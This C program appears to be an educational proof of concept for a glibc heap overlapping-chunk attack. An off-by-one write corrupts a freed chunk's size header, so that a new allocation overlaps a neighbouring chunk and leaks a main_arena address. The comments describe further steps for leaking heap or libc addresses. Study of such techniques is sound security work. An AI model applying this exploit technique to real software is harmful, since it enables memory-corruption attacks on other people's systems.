#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WORD_SIZE ((size_t)-1 > 0xffffffffUL ? 8 : 4)

int get_chunk_size(void *chunk){
 return (*(int*)(chunk - WORD_SIZE) & ~0x03) - WORD_SIZE; // ~0x03 gets rid of the last |M|A|P| bits used in the size header
}

void main() {
 char * A, * B, * C;

 A = malloc(0x100 - WORD_SIZE); // This is where the overflow happens
 B = malloc(0x100 - WORD_SIZE); // Free chunk being extended
 C = malloc(0x80 - WORD_SIZE); // Chunk being overlapped
 fprintf(stderr, "[+] Allocated A, B, C)\n");
 fprintf(stderr, "[+] A(%d) chunk: %p -> %p\n", get_chunk_size(A), A, A + get_chunk_size(A)); 
 fprintf(stderr, "[+] B(%d) chunk: %p -> %p\n", get_chunk_size(B), B, B + get_chunk_size(B)); 
 fprintf(stderr, "[+] C(%d) chunk: %p -> %p\n", get_chunk_size(C), C, C + get_chunk_size(C)); 

 memset(A, 'A', get_chunk_size(A));
 memset(B, 'B', get_chunk_size(B));
 memset(C, 'C', get_chunk_size(C));

 A[get_chunk_size(A)-1] = '\0';
 B[get_chunk_size(B)-1] = '\0';
 C[get_chunk_size(C)-1] = '\0';
 // C[0x80-8-1] = '\0';
 fprintf(stderr, "*A = %s\n", A);
 fprintf(stderr, "*B = %s\n", B);
 fprintf(stderr, "*C = %s\n", C);
 free(B); // Freeing B

 fprintf(stderr, "\n[+] &A[%d] points to %p. Overflown into B's size header least significant byte at %p \n",
	 get_chunk_size(A),
 	 &A[get_chunk_size(A)],
	 (int*)(B-WORD_SIZE));
 fprintf(stderr, "\n[+] Triggering an out-of-bounds one byte write (off-by-one) to A[%d]\n", get_chunk_size(A));
/* A overflows into B
 * B's size becomes 0x191 instead of 0x101
 */
 A[get_chunk_size(A)] = 0x91;
 // The following passes some checks about size vs prev_size
 B[0x180] = 0x90;
 B[0x181] = 0x1; // Effectively: 0x190

 B = malloc(0x100 + get_chunk_size(C)); // Allocation of old B size + C size
 // memset(B, 'B', WORD_SIZE*2); // Restore first bytes of B to 'B's to prevent main_arena leak
 fprintf(stderr, "[+] B(%d) chunk: %p -> (%p) BOO...\n", get_chunk_size(B), B, B + get_chunk_size(B)); 
 fprintf(stderr, "[+] C(%d) chunk: %p -> (%p) ...OOM\n", get_chunk_size(C), C, C + get_chunk_size(C)); 
 B[get_chunk_size(B)-1] = '\0';

 // Write a X at the end of B, effectively writing to the overlapped C chunk
 fprintf(stderr, "[+] Writing a 'X' at *(B+0x180-SIZE_HEADER) which will be written to the end of *C as well\n");
 //-1 to not overflow; another -1 to write at the end before the null byte \0
 B[0x100+0x80-WORD_SIZE-1-1] = 'X'; //This is a valid address inside B and it is also the end of chunk C

 fprintf(stderr, "*B = %s <-- address of 'main_arena->top' leaked!\n", B);
 fprintf(stderr, "*C = %s\n", C);
 // fprintf(stderr, "size_C: %p\n", size_C);
 // We can now tamper with Chunk C:
 // Call free(C) on it and then leak heap or main_arena addresses by reading B's contents
}
